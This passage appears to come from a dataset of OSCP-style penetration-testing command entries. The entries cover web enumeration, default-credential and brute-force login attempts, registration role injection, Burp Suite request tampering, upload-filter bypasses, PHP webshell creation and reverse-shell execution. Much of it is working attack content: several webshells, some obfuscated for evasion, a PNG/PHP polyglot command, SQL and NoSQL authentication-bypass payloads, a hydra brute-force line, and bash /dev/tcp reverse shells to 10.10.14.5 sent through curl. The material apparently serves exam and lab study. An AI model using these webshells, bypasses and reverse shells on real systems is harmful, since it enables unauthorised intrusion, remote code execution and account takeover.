    - X-Powered-By (PHP/7.4.3)
    - Set-Cookie (session management)
    - X-Frame-Options, CSP (security headers)

(7) Error message analysis
    - Trigger errors intentionally
    - SQL errors (database type, version)
    - Path disclosure (/var/www/html/index.php)
    - Stack traces (framework, libraries)

(8) Session management
    - Cookie inspection (F12 → Application → Cookies)
    - Session token format (predictable? JWT?)
    - Session fixation testing
    - Logout functionality

(9) Authentication testing
    - Default credentials (admin:admin, admin:password)
    - Password reset functionality
    - Registration page (if available)
    - Account lockout policy
    - Brute force protection

(10) Attack surface mapping
    - List all forms and inputs
    - List all parameters (GET, POST)
    - List all cookies
    - List all endpoints (/api/, /admin/, /user/)
    - Identify high-value targets

Common OSCP findings from manual enumeration:
(1) Version numbers in page source
    → Search for CVEs, public exploits

(2) Hidden admin panel in robots.txt
    → Disallow: /admin
    → Browse to /admin for login

(3) SQL injection in login form
    → Test with single quote
    → Error reveals MySQL version

(4) File upload without validation
    → Upload PHP webshell
    → RCE achieved

(5) Path disclosure in error messages
    → /var/www/html/ revealed
    → Helps with LFI exploitation

Browser tools (F12 DevTools):
- Elements: Inspect HTML, modify forms
- Console: Execute JavaScript, API testing
- Network: HTTP requests/responses, parameters
- Application: Cookies, localStorage, sessionStorage
- Sources: JavaScript source code, debugging

Manual testing workflow:
1. Visit http://target (THIS STEP)
2. Browse all pages, map functionality
3. View source, check for comments/credentials
4. Test one input manually (SQL injection with ')
5. If vulnerable, proceed with SQLMap
6. If not, continue manual testing other inputs

Key observations to document:
- Framework/technology (guides exploit selection)
- Version numbers (CVE search)
- Input fields (attack vectors)
- Upload functionality (webshell upload)
- Admin panel location (privilege escalation)
- Error messages (information disclosure)

OSCP exam tip: Spend 10-15 minutes on manual enumeration BEFORE running tools. Document everything in enumeration.md. Manual testing often reveals vulns that tools miss (logic flaws, weak passwords, exposed admin panels). Trust manual verification over automated tools.

Time estimate: 10-20 minutes (thorough manual enumeration)","high"
"web-version-enumeration","Web Technology Version Enumeration","web","whatweb <TARGET> -v","Enumerate web application technologies, frameworks, and versions to identify CVEs and public exploits","enumeration","VERSION ENUMERATION → CVE SEARCH → PUBLIC EXPLOIT: Standard OSCP workflow.

WhatWeb usage:
whatweb http://target              - Brief output
whatweb -v http://target           - Verbose (RECOMMENDED)
whatweb -a 3 http://target         - Aggressive mode (more plugins, louder)
whatweb http://target --log-json=output.json - JSON output for parsing

Common technologies detected:
Web Servers:
- Apache/2.4.41 (Ubuntu)
- nginx/1.18.0
- Microsoft-IIS/10.0

Languages:
- PHP/7.4.3
- Python/3.8 (Django, Flask)
- Ruby/2.7 (Rails)
- ASP.NET

Frameworks:
- Laravel 8.x
- WordPress 5.8.1
- Drupal 9
- Joomla 3.9

OSCP exploitation workflow:
1. Enumerate versions (THIS COMMAND)
   whatweb -v http://target

2. Extract key versions
   Example output:
   Apache/2.4.41, PHP/7.4.3, Laravel 8.75.0

3. Search for CVEs
   searchsploit laravel 8.75
   searchsploit apache 2.4.41
   searchsploit php 7.4

4. Research vulnerabilities
   Google: ""Laravel 8.75 CVE""
   ExploitDB: https://www.exploit-db.com/
   GitHub: Search for ""Laravel 8.75 exploit""

5. Test exploit
   Download PoC, modify for target, execute

6. Document in vulnerability_research.md

Alternative enumeration methods:
Method 1: curl headers
curl -I http://target
→ Server: Apache/2.4.41
→ X-Powered-By: PHP/7.4.3

Method 2: Wappalyzer (browser extension)
→ Click icon in browser
→ Shows technologies visually

Method 3: Manual page source inspection
View source (Ctrl+U) and search for:
- <meta name=""generator"" content=""WordPress 5.8"">
- <script src=""/js/jquery-3.5.1.min.js""></script>
- <!-- Laravel v8.75.0 -->

Method 4: Nmap HTTP enumeration
nmap -p 80 --script http-enum,http-headers,http-title target

Method 5: Nikto
nikto -h http://target
→ Comprehensive but slow and loud

Common OSCP scenarios:
(1) Laravel version with CVE
    whatweb reveals: Laravel/8.40.0
    → SearchSploit: Laravel 8.40.0 RCE (CVE-2021-3129)
    → Download exploit, achieve RCE

(2) WordPress with vulnerable plugin
    whatweb reveals: WordPress 5.8.1
    → wpscan --url http://target --enumerate vp
    → Find plugin with known exploit

(3) Apache with mod_cgi vulnerability
    whatweb reveals: Apache/2.4.49
    → Search: Shellshock, Path Traversal (CVE-2021-41773)
    → Exploit for RCE

(4) Outdated PHP version
    whatweb reveals: PHP/5.6.40
    → Multiple known vulnerabilities
    → Exploit PHP-FPM/FastCGI issues

Version format interpretation:
Apache/2.4.41 (Ubuntu) OpenSSL/1.1.1g
│      │       │         │
│      │       │         └─ SSL library version
│      │       └─ Operating system
│      └─ Version number (Major.Minor.Patch)
└─ Software name

Critical versions to note:
- Web server (Apache, Nginx, IIS)
- Language runtime (PHP, Python, Ruby)
- Framework (Laravel, Django, Rails, WordPress)
- CMS (WordPress, Joomla, Drupal)
- Libraries (jQuery, Bootstrap)

Searching for exploits:
# SearchSploit (local ExploitDB)
searchsploit <TECHNOLOGY> <VERSION>
searchsploit -m <EDB-ID>  # Download exploit

# Google dorks
""<TECHNOLOGY> <VERSION>"" CVE
""<TECHNOLOGY> <VERSION>"" exploit
""<TECHNOLOGY> <VERSION>"" RCE

# ExploitDB online
https://www.exploit-db.com/search?q=<TECHNOLOGY>

# GitHub
site:github.com ""<TECHNOLOGY> <VERSION>"" exploit

OSCP exam tip: Run whatweb immediately after confirming web service. Focus on versions that are 2+ years old (likely vulnerable). Cross-reference with searchsploit. If no direct exploit, search for authentication bypass, RCE, file upload vulnerabilities for that technology.

Time estimate: 30 seconds (whatweb) + 5-10 minutes (CVE research)","high"
"web-login-admin-panel","Web Admin Panel Login Attempt","web","Navigate to /admin, /login, /administrator and test default credentials","Access web application admin panel using default credentials, found credentials, or password reuse for privilege escalation","authentication","CRITICAL OSCP PRIVILEGE ESCALATION: Admin panel access = RCE via file upload.

Admin panel discovery methods:
(1) Manual browsing
    - http://target/admin
    - http://target/administrator  
    - http://target/login
    - http://target/backend
    - http://target/wp-admin (WordPress)
    - http://target/phpmyadmin (Database)

(2) robots.txt
    Disallow: /admin
    → Hidden admin panel location revealed

(3) Gobuster/dirb
    gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
    → Finds /admin, /login, /administrator

(4) Page source comments
    <!-- TODO: Secure /admin/backdoor.php -->

(5) Error messages
    → Redirect to /admin/login.php

Default credentials to test:
admin:admin
admin:password
admin:password123
admin:admin123
administrator:administrator
root:root
root:password
root:toor
test:test
guest:guest

Framework-specific defaults:
WordPress: admin:password
Joomla: admin:admin
Drupal: admin:admin
phpMyAdmin: root:(blank)
Tomcat: admin:admin, tomcat:tomcat

OSCP credential reuse workflow:
1. SQL injection → Dump users table
   sqlmap -r request.txt --dump -T users

2. Extract admin credentials
   admin:$2y$10$... (bcrypt hash)

3. Crack hash
   john --format=bcrypt --wordlist=rockyou.txt hashes.txt
   → admin:whatever1

4. Test on admin panel (THIS COMMAND)
   Navigate to /admin
   Username: admin
   Password: whatever1
   → Login successful

5. Upload webshell
   → RCE achieved

Common OSCP scenarios:
(1) Database credentials work on admin panel
    From config.php: dbuser:dbpass123
    Test: /admin login with dbuser:dbpass123
    → Success (password reuse)

(2) Default credentials still configured
    Fresh WordPress install: admin:password
    → Immediate admin access

(3) Weak credentials
    Brute force with common passwords
    admin:admin123 works
    → Admin panel compromised

(4) Password reset exploitation
    Reset form vulnerable to SQLi
    → Bypass authentication
    → Admin session obtained

Admin panel exploitation paths:
(1) File upload
    → Upload PHP webshell
    → Browse to uploaded file
    → RCE achieved

(2) Plugin/theme installation (WordPress)
    → Install malicious plugin with webshell
    → Activate plugin
    → RCE achieved

(3) Template/theme editing
    → Edit theme file (404.php, header.php)
    → Add PHP webshell code
    → Browse to modified theme file
    → RCE achieved

(4) Settings modification
    → Change upload restrictions
    → Enable dangerous features
    → Exploit newly enabled functionality

(5) User management
    → Create new admin user
    → Persistence established

Burp Suite testing:
1. Intercept login request
2. Send to Intruder
3. Set payload positions (username, password)
4. Load wordlist
5. Start attack
6. Look for different response length/status

Manual credential testing:
# Small list (manual)
admin:admin
admin:password
admin:admin123

# Medium list (Burp)
Load top 100 passwords
Test against admin user

# Large list (Hydra)
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form ""/admin/login.php:username=^USER^&password=^PASS^:F=Invalid""

Session hijacking (if SQLi available):
1. Dump session table
   SELECT * FROM sessions WHERE user_id = 1 (admin)

2. Extract admin session token
   session_token: abc123def456

3. Set cookie in browser
   Document.cookie = ""PHPSESSID=abc123def456""

4. Refresh page
   → Logged in as admin

Authentication bypass techniques:
(1) SQL injection
    Username: admin'--
    Password: anything
    → Bypasses password check

(2) NoSQL injection (MongoDB)
    Username: admin
    Password: {""$ne"": """"}
    → Not equal to empty = always true

(3) Session fixation
    Set session cookie before login
    → Session reused after authentication

(4) Password reset token prediction
    Analyze reset token format
    → Generate valid token
    → Reset admin password

OSCP exam tip: Check for admin panel in first 5 minutes of web enum. Test default credentials immediately. If SQL injection found, prioritize dumping user credentials for admin access. Admin panel + file upload = guaranteed RCE.

Time estimate: 2-5 minutes (discovery) + 1-10 minutes (credential testing)","high"
"user-registration-test","Test User Registration Functionality","web","Register new account and test for privilege escalation opportunities","Test user registration to create account and identify privilege escalation vectors (role manipulation, SQL injection, etc.)","authentication","USER REGISTRATION → PRIVILEGE ESCALATION: Common OSCP vector.

Registration testing workflow:
1. Find registration page
   - /register, /signup, /create-account
   - Look for ""Sign up"" link on login page

2. Intercept registration request (Burp Suite)
   - Capture POST to /register
   - Examine parameters

3. Test for vulnerabilities (THIS STEP)
   a. Role/privilege manipulation
   b. SQL injection in registration fields
   c. Username enumeration
   d. Email verification bypass

4. Create account
   - Use test credentials
   - Document account details

5. Test account functionality
   - Login with new account
   - Explore available features
   - Look for elevation paths

Common registration vulnerabilities:
(1) Role parameter manipulation
    Normal request:
    POST /register
    username=test&password=test123&email=test@test.com

    Modified request:
    POST /register  
    username=test&password=test123&email=test@test.com&role=admin
    → Account created with admin privileges

(2) SQL injection in registration
    Username: admin'-- 
    → May overwrite existing admin account
    → Or bypass validation

(3) Email verification bypass
    Register: user@test.com
    Intercept verification link
    Modify user_id parameter
    → Verify different user's account

(4) Username collision
    Register: admin (lowercase)
    → May conflict with Admin (uppercase)
    → Gain Admin privileges

(5) Mass assignment
    Add parameters:
    is_admin=1, is_verified=1, role=admin
    → Framework auto-assigns to user object

(6) NoSQL injection (MongoDB)
    Username: {""$ne"": null}
    → Bypasses validation

(7) Client-side validation bypass
    Disable JavaScript
    Submit invalid data
    → Server doesn't re-validate

Burp Suite registration testing:
1. Browse to /register
2. Fill form with test data
3. Intercept request (Proxy → Intercept)
4. Send to Repeater (Ctrl+R)
5. Add parameters:
   &role=admin
   &is_admin=true
   &user_type=administrator
6. Forward request
7. Check if account has elevated privileges

OSCP HackTheBox Usage machine example:
Standard registration:
POST /register
username=test&password=test123&email=test@test.com
→ Regular user created

Modified registration (role injection):
POST /register
username=test&password=test123&email=test@test.com&role=1
→ Admin user created (if role parameter not sanitized)

Testing methodology:
Test 1: Basic registration
- Register normally
- Verify account works
- Document baseline

Test 2: Role manipulation
- Add &role=admin to request
- Add &is_admin=1 to request
- Add &user_type=administrator to request
- Check if privileges elevated

Test 3: SQL injection
- Username: admin'--
- Password: anything
- Check if existing admin overwritten

Test 4: Email enumeration
- Register with existing email
- Check error message
- ""Email already registered"" = enumeration

Test 5: Username enumeration  
- Register with existing username
- Check error message
- ""Username taken"" = enumeration

Registration parameter fuzzing:
Common parameter names to test:
role, is_admin, admin, user_type, privilege, access_level, rank, status, is_verified, verified, active, approved, permissions

For each parameter, try values:
1, true, admin, administrator, root, superuser

Post-registration testing:
1. Login with new account
2. Check user profile/settings
   - Can you modify role?
   - Can you see other users?
   - Can you access admin features?

3. Test privilege escalation
   - Browse to /admin
   - Try admin functions
   - Check if role persisted

4. Session analysis
   - Examine cookies
   - Look for role in JWT
   - Modify session data

OSCP exam scenarios:
(1) Registration with role parameter
    → Create admin account
    → Access admin panel
    → Upload webshell
    → RCE

(2) SQL injection in username
    → Overwrite admin account
    → Login as admin with your password
    → Admin access

(3) Email verification bypass
    → Create account
    → Modify verification token
    → Verify as admin
    → Elevated privileges

OSCP exam tip: If registration available, test immediately. Intercept with Burp, add privilege parameters (role, is_admin, user_type). Even if it doesn't work, you've created a test account for further testing. Common in web challenges.

Time estimate: 5-10 minutes (registration testing) + 5 minutes (privilege verification)","medium"
"burpsuite-intercept-request","Burp Suite Intercept HTTP Request","web","Proxy → Intercept → Capture request → Modify parameters → Forward","Intercept and modify HTTP requests using Burp Suite to test for parameter manipulation, SQL injection, and authentication bypass","proxy","CRITICAL OSCP TOOL: Burp Suite for request manipulation and parameter testing.

Burp Suite setup:
1. Start Burp Suite
   burpsuite &
   → Select Temporary Project
   → Use Burp defaults

2. Configure browser proxy
   Firefox:
   Settings → Network Settings → Manual proxy
   HTTP Proxy: 127.0.0.1
   Port: 8080
   ✓ Use this proxy for all protocols

3. Install Burp CA certificate (for HTTPS)
   Browse to: http://burp
   Click ""CA Certificate""
   Firefox: Settings → Privacy & Security → Certificates → View Certificates → Import

4. Enable interception
   Proxy tab → Intercept sub-tab
   Click ""Intercept is on"" (should be on)

Request interception workflow:
1. Browse to target website
2. Perform action (submit form, click link)
3. Request intercepted in Burp
4. Modify parameters (THIS STEP)
5. Click ""Forward"" to send
6. View response in browser

Common modifications:
(1) Parameter injection
    Original: username=test&password=test123
    Modified: username=test&password=test123&role=admin
    → Test for privilege escalation

(2) SQL injection testing
    Original: username=admin&password=pass
    Modified: username=admin'--&password=anything
    → Test for SQLi in login

(3) File upload bypass
    Original: Content-Type: image/png
    Modified: Content-Type: image/png
              filename=""shell.php.png""
    → Bypass upload restrictions

(4) Session token manipulation
    Original: Cookie: session=abc123
    Modified: Cookie: session=admin_session_token
    → Session hijacking

(5) Hidden field modification
    Original: <input type=""hidden"" name=""price"" value=""100"">
    Modified: price=1
    → Price manipulation

Burp Suite tools:
Proxy:
- Intercept: Capture and modify requests in real-time
- HTTP history: View all requests/responses
- WebSockets history: WS traffic

Repeater:
- Repeat requests with modifications
- Easier than re-intercepting
- Send with Ctrl+R from any request

Intruder:
- Automated parameter fuzzing
- Brute force attacks
- Wordlist-based testing

Decoder:
- URL encode/decode
- Base64 encode/decode
- HTML encode/decode

Comparer:
- Compare two requests/responses
- Identify differences

Common OSCP use cases:
(1) Password reset token manipulation
    Intercept reset request
    POST /reset
    email=victim@test.com&token=abc123
    
    Modify email:
    email=attacker@test.com&token=abc123
    → Reset attacker's password with victim's token

(2) File upload type bypass  
    Intercept upload request
    Content-Type: application/x-php
    
    Change to allowed type:
    Content-Type: image/png
    → Upload PHP shell as PNG

(3) Parameter pollution
    Original: ?id=1
    Modified: ?id=1&id=2&id=3
    → May bypass validation

(4) HTTP method manipulation
    Original: POST /admin
    Modified: GET /admin
    → Bypass method-based access control

(5) Authentication bypass
    Original: username=test&password=wrong
    Modified: username=admin'-- &password=anything
    → SQL injection auth bypass

Saving requests for later:
1. Right-click request → ""Copy to file""
2. Save as reset.req
3. Use with SQLMap:
   sqlmap -r reset.req -p email

OSCP workflow for password reset exploitation:
1. Navigate to password reset
2. Enter email, intercept request (THIS COMMAND)
3. Modify email parameter
   POST /reset  
   email=victim@test.com → email=attacker@test.com
4. Forward request
5. Check if token sent to attacker email
6. Use token to reset victim password

Burp Suite keyboard shortcuts:
Ctrl+R: Send to Repeater
Ctrl+I: Send to Intruder
Ctrl+Space: Toggle intercept
Ctrl+Shift+B: Base64 encode
Ctrl+Shift+U: URL encode

Repeater workflow (easier than intercepting):
1. Intercept request once
2. Send to Repeater (Ctrl+R)
3. Modify in Repeater
4. Click ""Send""
5. View response immediately
6. Modify again, resend
→ Much faster for testing multiple variations

OSCP exam tip: Use Burp for ALL web testing. Intercept login, registration, upload, password reset requests. Look for hidden parameters, role fields, admin flags. Save important requests to files for SQLMap. Repeater is faster than re-intercepting.

Time estimate: 30 seconds per request interception + variable modification time","high"
"burpsuite-modify-upload","Burp Suite Modify File Upload","web","Intercept upload request → Modify Content-Type → Modify filename → Forward","Bypass file upload restrictions using Burp Suite to upload webshell by modifying Content-Type headers and filenames","file-upload","CRITICAL OSCP RCE VECTOR: File upload bypass → Webshell upload → RCE.

File upload bypass techniques:
(1) Content-Type manipulation
    Client-side validation (BYPASS)
    Original request:
    Content-Type: application/x-php
    filename=""shell.php""
    
    Modified (THIS TECHNIQUE):
    Content-Type: image/png
    filename=""shell.php""
    → Bypass MIME type check

(2) Double extension
    filename=""shell.php.png""
    → Server processes as PHP if misconfigured

(3) Null byte injection (older PHP)
    filename=""shell.php%00.png""
    → Truncates at null byte, saves as shell.php

(4) Case sensitivity bypass
    filename=""shell.PhP""
    → Blacklist may only check .php (lowercase)

(5) Alternate PHP extensions
    .phtml, .php3, .php4, .php5, .phar, .phps
    → May not be blacklisted

(6) Path traversal
    filename=""../../../var/www/html/shell.php""
    → Upload to web-accessible location

(7) Polyglot file (magic bytes + PHP)
    PNG header + PHP code
    → Passes magic byte validation
    → Executes as PHP if accessed directly

Burp Suite file upload bypass workflow:
1. Prepare webshell
   Create shell.php with PHP webshell code

2. Attempt normal upload
   Upload shell.php through web form
   → Likely rejected

3. Intercept upload request (THIS STEP)
   Burp → Proxy → Intercept ON
   Re-submit upload
   → Request captured

4. Analyze request
   POST /upload HTTP/1.1
   Content-Type: multipart/form-data; boundary=----123
   
   ------123
   Content-Disposition: form-data; name=""file""; filename=""shell.php""
   Content-Type: application/x-php
   
   <?php system($_GET['cmd']); ?>
   ------123--

5. Modify for bypass
   Change Content-Type: image/png
   Or change filename: shell.php.png
   Or both

6. Forward request
   → Upload successful

7. Access uploaded file
   http://target/uploads/shell.php.png?cmd=whoami
   → RCE achieved

Common upload locations:
/uploads/
/upload/
/files/
/images/
/media/
/assets/
/user_uploads/
/public/uploads/
/var/www/html/uploads/

Finding upload directory:
Method 1: Check upload response
→ {""status"":""success"",""path"":""/uploads/file.php""}

Method 2: View page source
→ <img src=""/uploads/image.png"">

Method 3: Gobuster
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
→ /uploads (Status: 200)

Method 4: Burp response
Upload test file, check response headers
→ Location: /uploads/test.txt

OSCP HackTheBox Usage machine example:
1. Admin panel has avatar upload
2. Upload shell.php → Rejected (""Only images allowed"")
3. Intercept with Burp
4. Modify:
   filename=""shell.php""
   Content-Type: image/png
5. Forward → Upload successful
6. Find upload directory:
   View profile page source
   → <img src=""/avatars/shell.php"">
7. Access webshell:
   http://target/avatars/shell.php?cmd=whoami
   → www-data
8. Execute reverse shell:
   http://target/avatars/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F9001%200%3E%261%27
   → Shell received

Polyglot file creation:
# Create PNG with PHP code
printf '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x01\x00\x00\x00\x007n\xf9$\x00\x00\x00\nIDATx\x9cc`\x00\x00\x00\x02\x00\x01H\xaf\xa4q\x00\x00\x00\x00IEND\xaeB`\x82<?php system($_GET[""cmd""]); ?>' > shell.php.png

# Upload shell.php.png
# Access as PHP:
http://target/uploads/shell.php.png?cmd=id
→ If server executes PHP in images directory, RCE

Alternate extensions to test:
.php → Blocked
.phtml → Try this
.php3 → Try this  
.php4 → Try this
.php5 → Try this
.phar → Try this
.phps → Try this

Bypass validation checklist:
□ Content-Type: image/png, image/jpeg, image/gif
□ Filename: shell.php.png, shell.png.php, shell.php%00.png
□ Extension: .phtml, .php3, .php4, .php5
□ Path traversal: ../../../uploads/shell.php
□ Case variation: shell.PhP, shell.Php
□ Magic bytes: Add PNG header to PHP file
□ Double upload: Upload image first, then PHP with same name

Verifying upload:
# Check if file uploaded
curl http://target/uploads/shell.php

# Test command execution  
curl http://target/uploads/shell.php?cmd=id
→ uid=33(www-data) gid=33(www-data)

# Get reverse shell
curl 'http://target/uploads/shell.php?cmd=bash%20-c%20""bash%20-i%20>%26%20/dev/tcp/10.10.14.5/9001%200>%261""'

OSCP exam tip: File upload = HIGH priority target. Immediately test with Burp modification. Try Content-Type bypass first (fastest). If rejected, try double extension, then alternate extensions. Document upload directory location. One successful webshell upload = guaranteed RCE.

Time estimate: 2-5 minutes (bypass testing) + 1 minute (RCE verification)","high"
"create-php-webshell","Create PHP Webshell","web","echo '<?php system($_GET[""cmd""]); ?>' > shell.php","Create simple PHP webshell for command execution after file upload bypass or arbitrary file write vulnerability","webshell","PHP WEBSHELL: Minimal code for maximum RCE.

Webshell variations:
(1) Minimal (THIS COMMAND)
    <?php system($_GET['cmd']); ?>
    Usage: shell.php?cmd=whoami
    → Smallest, easiest to upload

(2) Shell_exec (better output handling)
    <?php echo shell_exec($_GET['cmd']); ?>
    Usage: shell.php?cmd=ls -la
    → Returns full output including stderr

(3) Passthru (binary-safe)
    <?php passthru($_GET['cmd']); ?>
    Usage: shell.php?cmd=cat /etc/passwd
    → Good for binary files

(4) Exec (array output)
    <?php exec($_GET['cmd'], $output); print_r($output); ?>
    Usage: shell.php?cmd=id
    → Returns array of output lines

(5) Multi-parameter  
    <?php system($_POST['cmd']); ?>
    Usage: curl -X POST -d 'cmd=whoami' http://target/shell.php
    → Harder to detect in logs

(6) Obfuscated (bypass WAF)
    <?php $a='sys'.'tem'; $a($_GET['c']); ?>
    Usage: shell.php?c=id
    → Evades simple keyword detection

(7) Base64 encoded
    <?php eval(base64_decode($_GET['c'])); ?>
    Usage: shell.php?c=c3lzdGVtKCdpZCcp
    → Very evasive

(8) Full-featured (not minimal)
    <?php
    if(isset($_GET['cmd'])) {
      $cmd = $_GET['cmd'];
      echo ""<pre>"";
      system($cmd);
      echo ""</pre>"";
    }
    ?>
    → Better formatting, safer

Webshell upload workflow:
1. Create webshell (THIS COMMAND)
   echo '<?php system($_GET[""cmd""]); ?>' > shell.php

2. Upload via file upload
   Navigate to upload form
   Select shell.php
   Intercept with Burp
   Modify Content-Type to image/png
   Forward
   → Upload successful

3. Find upload location
   Check response: {""path"":""/uploads/shell.php""}
   Or check page source
   Or gobuster

4. Access webshell
   http://target/uploads/shell.php?cmd=whoami
   → www-data

5. Execute commands
   http://target/uploads/shell.php?cmd=id
   http://target/uploads/shell.php?cmd=pwd
   http://target/uploads/shell.php?cmd=ls -la

6. Get reverse shell
   http://target/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'
   → Full interactive shell

Command execution via webshell:
# URL encode special characters
whoami → whoami
ls -la → ls%20-la
cat /etc/passwd → cat%20/etc/passwd
id → id

# Complex commands need full URL encoding
bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'
→ bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F9001%200%3E%261%27

Using curl for webshell:
# GET request
curl 'http://target/shell.php?cmd=whoami'
→ www-data

# POST request (stealthier)
curl -X POST -d 'cmd=id' http://target/shell.php
→ uid=33(www-data)

# Reverse shell via webshell
curl 'http://target/shell.php?cmd=bash%20-c%20""bash%20-i%20>%26%20/dev/tcp/10.10.14.5/9001%200>%261""'

OSCP HackTheBox Usage machine workflow:
1. Admin panel avatar upload
2. Create shell.php (THIS COMMAND)
3. Upload → Rejected
4. Burp intercept
5. Change Content-Type: image/png
6. Forward → Success
7. Access: http://usage.htb/avatars/shell.php?cmd=id
   → uid=33(www-data)
8. Reverse shell:
   nc -lvnp 9001  # Attacker
   http://usage.htb/avatars/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'
   → Shell received

Advanced webshell features:
# File browser
<?php
if(isset($_GET['path'])) {
  $files = scandir($_GET['path']);
  print_r($files);
}
?>
Usage: shell.php?path=/var/www/html

# File read
<?php
if(isset($_GET['file'])) {
  echo file_get_contents($_GET['file']);
}
?>
Usage: shell.php?file=/etc/passwd

# Command + file operations
<?php
if(isset($_GET['cmd'])) system($_GET['cmd']);
if(isset($_GET['file'])) echo file_get_contents($_GET['file']);
?>

Webshell detection evasion:
(1) Rename function
    $a='sys'.'tem'; $a($_GET['c']);

(2) Variable function name
    $f=$_GET['f']; $f($_GET['c']);
    Usage: shell.php?f=system&c=id

(3) Preg_replace (deprecated but works)
    preg_replace('/.*/e', $_GET['c'], '');

(4) Assert (disabled in PHP 7.2+)
    assert($_GET['c']);

(5) Create_function (deprecated)
    $f=create_function('',$_GET['c']); $f();

Troubleshooting PHP execution:
# Check if PHP enabled
curl http://target/test.php
→ If code displayed = not enabled
→ If executed = enabled

# Check upload directory for PHP execution
Create .htaccess in uploads/:
AddType application/x-httpd-php .png
→ Enables PHP execution for .png files

# Alternative upload locations
/var/www/html/ (web root, usually executable)
/tmp/ (writable but not web-accessible)
/var/tmp/ (writable but not web-accessible)

OSCP exam tip: Create webshell BEFORE exam (save as template). Test upload immediately when finding upload form. Minimal webshell easier to upload (fewer WAF triggers). URL-encode reverse shell command before using in webshell. Document webshell location in breakthrough.md.

Time estimate: 30 seconds (creation) + 1-2 minutes (upload and testing)","high"
"web-access-uploaded-file","Access Uploaded Webshell","web","curl 'http://<TARGET>/uploads/<FILENAME>?cmd=<COMMAND>'","Access uploaded PHP webshell via HTTP request to execute commands and verify RCE","webshell","WEBSHELL ACCESS → COMMAND EXECUTION → REVERSE SHELL: Standard RCE workflow.

Webshell access methods:
(1) curl (THIS COMMAND)
    curl 'http://target/uploads/shell.php?cmd=whoami'
    → Best for scripting and reverse shells

(2) Browser
    http://target/uploads/shell.php?cmd=whoami
    → Good for interactive testing

(3) wget
    wget -q -O - 'http://target/uploads/shell.php?cmd=id'
    → Alternative to curl

(4) Python requests
    import requests
    r = requests.get('http://target/uploads/shell.php', params={'cmd':'id'})
    print(r.text)

Common commands to test:
# Verify execution
whoami → www-data, apache, nginx
id → uid=33(www-data) gid=33(www-data)
pwd → /var/www/html/uploads

# System enumeration
uname -a → Linux info
hostname → target hostname
cat /etc/passwd → User list
ls -la /home → Home directories

# Network enumeration  
ifconfig / ip a → IP addresses
netstat -tulpn → Listening ports
ps aux → Running processes

# File system
ls -la → Current directory
cat /etc/passwd → Users
find / -perm -4000 2>/dev/null → SUID binaries

URL encoding for webshells:
Spaces: %20 or +
Forward slash: %2F
Ampersand: %26
Pipe: %7C
Semicolon: %3B
Greater than: %3E
Less than: %3C
Single quote: %27
Double quote: %22

URL encoding examples:
# Simple command (no encoding needed)
whoami → whoami
id → id
pwd → pwd

# Command with spaces
ls -la → ls%20-la
cat /etc/passwd → cat%20/etc/passwd

# Complex command with pipes/redirects
ls -la | grep user → ls%20-la%20%7C%20grep%20user
cat /etc/passwd | cut -d: -f1 → cat%20/etc/passwd%20%7C%20cut%20-d%3A%20-f1

# Reverse shell (full encoding)
bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'
→ bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F9001%200%3E%261%27

Finding upload directory:
(1) Check upload response
    → {""status"":""success"",""file"":""/uploads/shell.php""}

(2) View page source
    → <img src=""/avatars/profile.png"">
    → Try /avatars/shell.php

(3) Gobuster
    gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
    → /uploads (Status: 200)

(4) Common paths
    /uploads/, /upload/, /files/, /images/, /media/,
    /avatars/, /pictures/, /assets/, /public/uploads/

OSCP workflow:
1. Create webshell
   echo '<?php system($_GET[""cmd""]); ?>' > shell.php

2. Upload with Burp bypass
   Intercept, modify Content-Type, forward

3. Find upload path
   Check response or gobuster

4. Test webshell (THIS COMMAND)
   curl 'http://target/uploads/shell.php?cmd=whoami'
   → www-data

5. Enumerate system
   curl 'http://target/uploads/shell.php?cmd=id'
   curl 'http://target/uploads/shell.php?cmd=uname -a'
   curl 'http://target/uploads/shell.php?cmd=ls -la /home'

6. Get reverse shell
   nc -lvnp 9001  # Attacker
   curl 'http://target/uploads/shell.php?cmd=bash -c ""bash -i >& /dev/tcp/10.10.14.5/9001 0>&1""'
   → Full shell received

Debugging webshell access:
# Test 1: Does file exist?
curl -I http://target/uploads/shell.php
→ 200 OK = File exists
→ 404 Not Found = Wrong path

# Test 2: Is PHP executing?
curl http://target/uploads/shell.php
→ If you see PHP code = Not executing
→ If empty or error = Executing but no output

# Test 3: Simple command
curl 'http://target/uploads/shell.php?cmd=echo success'
→ ""success"" = Working

# Test 4: Check user
curl 'http://target/uploads/shell.php?cmd=whoami'
→ www-data = Executing as web user

Quick enumeration via webshell:
# One-liner for multiple commands
for cmd in whoami id pwd ""uname -a"" ""ls -la""; do
  echo ""[+] $cmd""
  curl -s ""http://target/uploads/shell.php?cmd=$cmd""
  echo
done

OSCP exam tip: Test webshell with simple command first (whoami) before complex reverse shell. Save working webshell URL in notes. Use curl for automation, browser for interactive testing. If webshell works, immediately escalate to reverse shell (easier to work with).

Time estimate: 30 seconds (verification) + 2-5 minutes (enumeration)","high"
"webshell-execute-revshell","Execute Reverse Shell via Webshell","web","curl 'http://<TARGET>/uploads/<WEBSHELL>?cmd=bash -c ""bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1""'","Execute reverse shell command through webshell to upgrade from command execution to full interactive shell","webshell","WEBSHELL → REVERSE SHELL: Upgrade to full interactive shell.

WHY upgrade to reverse shell:
(1) Interactive: Tab completion, job control, text editors work
(2) Persistent: Doesn't timeout like webshell HTTP requests
(3) Stable: Less prone to connection drops
(4) Functional: Can run interactive commands (su, sudo, ssh)
(5) Faster: No URL encoding, direct command execution

Reverse shell workflow:
1. Start listener on attacker
   nc -lvnp 9001
   → Listening on 0.0.0.0 9001

2. Execute reverse shell via webshell (THIS COMMAND)
